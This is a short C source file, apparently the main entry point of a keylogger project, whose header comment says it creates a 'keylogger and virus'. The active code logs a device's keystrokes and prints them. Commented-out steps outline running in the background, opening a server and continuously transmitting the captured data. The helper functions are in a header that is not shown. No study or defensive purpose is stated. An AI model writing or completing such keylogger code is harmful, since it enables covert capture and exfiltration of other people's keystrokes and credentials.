/*
Main function to run to create keylogger and virus
*/

#include "keylogger.h"

void background_process(void) {
  // IMPLEMENTATION HERE
}

void main(void) {
  // background_process();
  // begin_keylogger();
  // open_server();
  // while (1) {
  //   transmit_data();
  // }
  // end_keylogger();
  // close_server();

  key_package key_package;
  key_package.keys_arr_size = 0;
  log_device(&key_package);
  log_keys(&key_package);
  print_logged_keys(key_package);
}
